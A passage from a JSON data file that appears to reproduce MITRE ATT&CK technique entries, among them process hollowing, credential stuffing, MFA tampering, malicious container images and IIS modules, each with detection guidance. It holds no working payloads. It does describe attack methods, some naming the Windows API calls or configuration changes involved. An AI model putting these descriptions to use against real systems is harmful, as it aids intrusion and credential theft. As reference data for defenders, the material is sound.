      "detection": ""
    },
    "T1027.005": {
      "id": "T1027.005",
      "name": "Indicator Removal from Tools",
      "description": "Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1027.005",
      "stix_id": "attack-pattern--b0533c6e-8fea-4788-874f-b799cacc4b92",
      "created": "2020-03-19T21:27:32.820000+00:00",
      "modified": "2025-04-16T20:37:19.031000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": "The first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network."
    },
    "T1204.003": {
      "id": "T1204.003",
      "name": "Malicious Image",
      "description": "Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via [Upload Malware](https://attack.mitre.org/techniques/T1608/001), and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.(Citation: Summit Route Malicious AMIs)\n\nAdversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: [Match Legitimate Resource Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation: Aqua Security Cloud Native Threat Report June 2021)",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1204.003",
      "stix_id": "attack-pattern--b0c74ef9-c61e-4986-88cb-78da98a355ec",
      "created": "2021-03-30T17:20:05.789000+00:00",
      "modified": "2025-04-25T14:47:40.745000+00:00",
      "platforms": [
        "IaaS",
        "Containers"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content",
        "Command: Command Execution",
        "Image: Image Creation",
        "Container: Container Start",
        "Container: Container Creation",
        "Instance: Instance Start",
        "Instance: Instance Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor the local image registry to make sure malicious images are not added. Track the deployment of new containers, especially from newly built images. Monitor the behavior of containers within the environment to detect anomalous behavior or malicious activity after users deploy from malicious images."
    },
    "T1543.005": {
      "id": "T1543.005",
      "name": "Container Service",
      "description": "Adversaries may create or modify container or container cluster management tools that run as daemons, agents, or services on individual hosts. These include software for creating and managing individual containers, such as Docker and Podman, as well as container cluster node-level agents such as kubelet. By modifying these services, an adversary may be able to achieve persistence or escalate their privileges on a host.\n\nFor example, by using the `docker run` or `podman run` command with the `restart=always` directive, a container can be configured to persistently restart on the host.(Citation: AquaSec TeamTNT 2023) A user with access to the (rootful) docker command may also be able to escalate their privileges on the host.(Citation: GTFOBins Docker)\n\nIn Kubernetes environments, DaemonSets allow an adversary to persistently [Deploy Container](https://attack.mitre.org/techniques/T1610)s on all nodes, including ones added later to the cluster.(Citation: Aquasec Kubernetes Attack 2023)(Citation: Kubernetes DaemonSet) Pods can also be deployed to specific nodes using the `nodeSelector` or `nodeName` fields in the pod spec.(Citation: Kubernetes Assigning Pods to Nodes)(Citation: AppSecco Kubernetes Namespace Breakout 2020)\n\nNote that containers can also be configured to run as [Systemd Service](https://attack.mitre.org/techniques/T1543/002)s.(Citation: Podman Systemd)(Citation: Docker Systemd)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1543.005",
      "stix_id": "attack-pattern--b0e54bf7-835e-4f44-bd8e-62f431b9b76a",
      "created": "2024-02-15T13:41:46.784000+00:00",
      "modified": "2025-04-15T22:10:00.252000+00:00",
      "platforms": [
        "Containers"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Container: Container Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1078": {
      "id": "T1078",
      "name": "Valid Accounts",
      "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1078",
      "stix_id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
      "created": "2017-05-31T21:31:00.645000+00:00",
      "modified": "2025-04-15T19:58:58.373000+00:00",
      "platforms": [
        "Windows",
        "SaaS",
        "IaaS",
        "Linux",
        "macOS",
        "Containers",
        "Network Devices",
        "Office Suite",
        "Identity Provider",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Logon Session: Logon Session Creation",
        "User Account: User Account Authentication",
        "Logon Session: Logon Session Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence. Checks on these accounts could also include whether default accounts such as Guest have been activated. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately."
    },
    "T1571": {
      "id": "T1571",
      "name": "Non-Standard Port",
      "description": "Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\n\nAdversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.(Citation: change_rdp_port_conti)",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1571",
      "stix_id": "attack-pattern--b18eae87-b469-4e14-b454-b171b416bc18",
      "created": "2020-03-14T18:18:32.443000+00:00",
      "modified": "2025-04-15T19:58:58.463000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2)"
    },
    "T1585.001": {
      "id": "T1585.001",
      "name": "Social Media Accounts",
      "description": "Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)\n\nFor operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. \n\nOnce a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1585.001",
      "stix_id": "attack-pattern--b1ccd744-3f78-4a0e-9bb2-2002057f7928",
      "created": "2020-10-01T01:08:41.124000+00:00",
      "modified": "2025-04-15T23:09:01.225000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Persona: Social Media"
      ],
      "defense_bypassed": [],
      "detection": "Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently created/modified accounts making numerous connection requests to accounts affiliated with your organization.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003))."
    },
    "T1055.012": {
      "id": "T1055.012",
      "name": "Process Hollowing",
      "description": "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \n\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Leitch Hollowing)(Citation: Elastic Process Injection July 2017)\n\nThis is very similar to [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process. ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1055.012",
      "stix_id": "attack-pattern--b200542e-e877-4395-875b-cf1a44537ca4",
      "created": "2020-01-14T17:21:54.470000+00:00",
      "modified": "2025-04-15T19:58:58.724000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Process: Process Modification",
        "Process: OS API Execution",
        "Process: Process Access"
      ],
      "defense_bypassed": [],
      "detection": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\n\nProcessing hollowing commonly involves spawning an otherwise benign victim process. Consider correlating detections of processes created in a suspended state (ex: through API flags or process\u2019 thread metadata) with other malicious activity such as attempts to modify a process' memory, especially by its parent process, or other abnormal process behavior.(Citation: Nviso Spoof Command Line 2020)(Citation: Mandiant Endpoint Evading 2019)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior."
    },
    "T1068": {
      "id": "T1068",
      "name": "Exploitation for Privilege Escalation",
      "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
      "tactic": "privilege-escalation",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1068",
      "stix_id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
      "created": "2017-05-31T21:30:55.066000+00:00",
      "modified": "2025-04-15T19:58:58.811000+00:00",
      "platforms": [
        "Containers",
        "Linux",
        "Windows",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Driver: Driver Load",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution or evidence of Discovery. Consider monitoring for the presence or loading (ex: Sysmon Event ID 6) of known vulnerable drivers that adversaries may drop and exploit to execute code in kernel mode.(Citation: Microsoft Driver Block Rules)\n\nHigher privileges are often necessary to perform additional actions such as some methods of [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Look for additional activity that may indicate an adversary has gained higher privileges."
    },
    "T1564.009": {
      "id": "T1564.009",
      "name": "Resource Forking",
      "description": "Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code.(Citation: macOS Hierarchical File System Overview) Usage of a resource fork is identifiable when displaying a file\u2019s extended attributes, using <code>ls -l@</code> or <code>xattr -l</code> commands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the <code>/Resources</code> folder.(Citation: Resource and Data Forks)(Citation: ELC Extended Attributes)\n\nAdversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.(Citation: sentinellabs resource named fork 2020)(Citation: tau bundlore erika noerenberg 2020)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1564.009",
      "stix_id": "attack-pattern--b22e5153-ac28-4cc6-865c-2054e36285cb",
      "created": "2021-10-12T20:02:31.866000+00:00",
      "modified": "2025-04-16T20:37:19.185000+00:00",
      "platforms": [
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Metadata",
        "Process: Process Creation",
        "Command: Command Execution",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": "Identify files with the <code>com.apple.ResourceFork</code> extended attribute and large data amounts stored in resource forks. \n\nMonitor command-line activity leveraging the use of resource forks, especially those immediately followed by potentially malicious activity such as creating network connections. "
    },
    "T1531": {
      "id": "T1531",
      "name": "Account Access Removal",
      "description": "Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. Adversaries may also subsequently log off and/or perform a [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to set malicious changes into place.(Citation: CarbonBlack LockerGoga 2019)(Citation: Unit42 LockerGoga 2019)\n\nIn Windows, [Net](https://attack.mitre.org/software/S0039) utility, <code>Set-LocalUser</code> and <code>Set-ADAccountPassword</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets may be used by adversaries to modify user accounts. Accounts could also be disabled by Group Policy. In Linux, the <code>passwd</code> utility may be used to change passwords. On ESXi servers, accounts can be removed or modified via esxcli (`system account set`, `system account remove`).\n\nAdversaries who use ransomware or similar attacks may first perform this and other Impact behaviors, such as [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Defacement](https://attack.mitre.org/techniques/T1491), in order to impede incident response/recovery before completing the [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) objective. ",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1531",
      "stix_id": "attack-pattern--b24e2a20-3b3d-4bf0-823b-1ed765398fb0",
      "created": "2019-10-09T18:48:31.906000+00:00",
      "modified": "2025-04-15T19:58:58.987000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "SaaS",
        "IaaS",
        "Office Suite",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Active Directory: Active Directory Object Modification",
        "User Account: User Account Modification",
        "User Account: User Account Deletion"
      ],
      "defense_bypassed": [],
      "detection": "Use process monitoring to monitor the execution and command line parameters of binaries involved in deleting accounts or changing passwords, such as use of [Net](https://attack.mitre.org/software/S0039). Windows event logs may also designate activity associated with an adversary's attempt to remove access to an account:\n\n* Event ID 4723 - An attempt was made to change an account's password\n* Event ID 4724 - An attempt was made to reset an account's password\n* Event ID 4726 - A user account was deleted\n* Event ID 4740 - A user account was locked out\n\nAlerting on [Net](https://attack.mitre.org/software/S0039) and these Event IDs may generate a high degree of false positives, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible."
    },
    "T1110.004": {
      "id": "T1110.004",
      "name": "Credential Stuffing",
      "description": "Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nCredential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.\n\nTypically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1110.004",
      "stix_id": "attack-pattern--b2d03cea-aec1-45ca-9744-9ee583c1e1cc",
      "created": "2020-02-11T18:39:59.959000+00:00",
      "modified": "2025-04-15T19:58:59.077000+00:00",
      "platforms": [
        "Windows",
        "SaaS",
        "IaaS",
        "Linux",
        "macOS",
        "Containers",
        "Network Devices",
        "Office Suite",
        "Identity Provider",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content",
        "User Account: User Account Authentication"
      ],
      "defense_bypassed": [],
      "detection": "Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials."
    },
    "T1027": {
      "id": "T1027",
      "name": "Obfuscated Files or Information",
      "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1027",
      "stix_id": "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a",
      "created": "2017-05-31T21:30:32.662000+00:00",
      "modified": "2025-04-15T19:58:59.251000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "WMI: WMI Creation",
        "Script: Script Execution",
        "File: File Creation",
        "Module: Module Load",
        "Application Log: Application Log Content",
        "Command: Command Execution",
        "File: File Metadata",
        "Process: OS API Execution",
        "Windows Registry: Windows Registry Key Creation",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system). \n\nFlag and analyze commands containing indicators of obfuscation and known suspicious syntax such as uninterpreted escape characters like '''^''' and '''\"'''. Windows' Sysmon and Event ID 4688 displays command-line arguments for processes. Deobfuscation tools can be used to detect these indicators in files/payloads. (Citation: GitHub Revoke-Obfuscation) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: GitHub Office-Crackros Aug 2016) \n\nObfuscation used in payloads for Initial Access can be detected at the network. Use network intrusion detection systems and email gateway filtering to identify compressed and encrypted attachments and scripts. Some email attachment detonation systems can open compressed and encrypted attachments. Payloads delivered over an encrypted connection from a website require encrypted network traffic inspection. \n\nThe first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network. "
    },
    "T1556.006": {
      "id": "T1556.006",
      "name": "Multi-Factor Authentication",
      "description": "Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.\n\nOnce adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621), adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.(Citation: Mandiant APT42)(Citation: Azure AD Conditional Access Exclusions)\n\nFor example, modifying the Windows hosts file (`C:\\windows\\system32\\drivers\\etc\\hosts`) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a \"fail open\" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA. (Citation: Russians Exploit Default MFA Protocol - CISA March 2022) \n\nDepending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.(Citation: Russians Exploit Default MFA Protocol - CISA March 2022) ",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1556.006",
      "stix_id": "attack-pattern--b4409cd8-0da9-46e1-a401-a241afd4d1cc",
      "created": "2022-05-31T19:31:38.431000+00:00",
      "modified": "2025-04-15T19:58:59.338000+00:00",
      "platforms": [
        "Windows",
        "SaaS",
        "IaaS",
        "Linux",
        "macOS",
        "Office Suite",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "Logon Session: Logon Session Creation",
        "Application Log: Application Log Content",
        "Active Directory: Active Directory Object Modification",
        "User Account: User Account Authentication",
        "User Account: User Account Modification"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1114.002": {
      "id": "T1114.002",
      "name": "Remote Email Collection",
      "description": "Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific keywords.",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1114.002",
      "stix_id": "attack-pattern--b4694861-542c-48ea-9eb1-10d356e7140a",
      "created": "2020-02-19T18:52:24.547000+00:00",
      "modified": "2025-04-15T22:59:50.429000+00:00",
      "platforms": [
        "Windows",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content",
        "Logon Session: Logon Session Creation",
        "Command: Command Execution",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for unusual login activity from unknown or abnormal locations, especially for privileged accounts (ex: Exchange administrator account)."
    },
    "T1505.004": {
      "id": "T1505.004",
      "name": "IIS Components",
      "description": "Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: <code>Get{Extension/Filter}Version</code>, <code>Http{Extension/Filter}Proc</code>, and (optionally) <code>Terminate{Extension/Filter}</code>. IIS modules may also be installed to extend IIS web servers.(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: IIS Backdoor 2011)(Citation: Trustwave IIS Module 2013)\n\nAdversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Extension All Incoming 2017)(Citation: Dell TG-3390)(Citation: Trustwave IIS Module 2013)(Citation: MMPC ISAPI Filter 2012)\n\nAdversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exports <code>RegisterModule</code>, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.(Citation: Microsoft IIS Modules Overview 2007)(Citation: Trustwave IIS Module 2013)(Citation: ESET IIS Malware 2021)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1505.004",
      "stix_id": "attack-pattern--b46a801b-fd98-491c-a25a-bca25d6e3001",
      "created": "2021-06-03T18:44:29.770000+00:00",
      "modified": "2025-04-25T14:47:43.995000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "Command: Command Execution",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for creation and/or modification of files (especially DLLs on webservers) that could be abused as malicious ISAPI extensions/filters or IIS modules. Changes to <code>%windir%\\system32\\inetsrv\\config\\applicationhost.config</code> could indicate an IIS module installation.(Citation: Microsoft IIS Modules Overview 2007)(Citation: ESET IIS Malware 2021)\n\nMonitor execution and command-line arguments of <code>AppCmd.exe</code>, which may be abused to install malicious IIS modules.(Citation: Microsoft IIS Modules Overview 2007)(Citation: Unit 42 RGDoor Jan 2018)(Citation: ESET IIS Malware 2021)"
    },
    "T1036.001": {
      "id": "T1036.001",
      "name": "Invalid Code Signature",
      "description": "Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.(Citation: Threatexpress MetaTwin 2017)\n\nUnlike [Code Signing](https://attack.mitre.org/techniques/T1553/002), this activity will not result in a valid signature.",
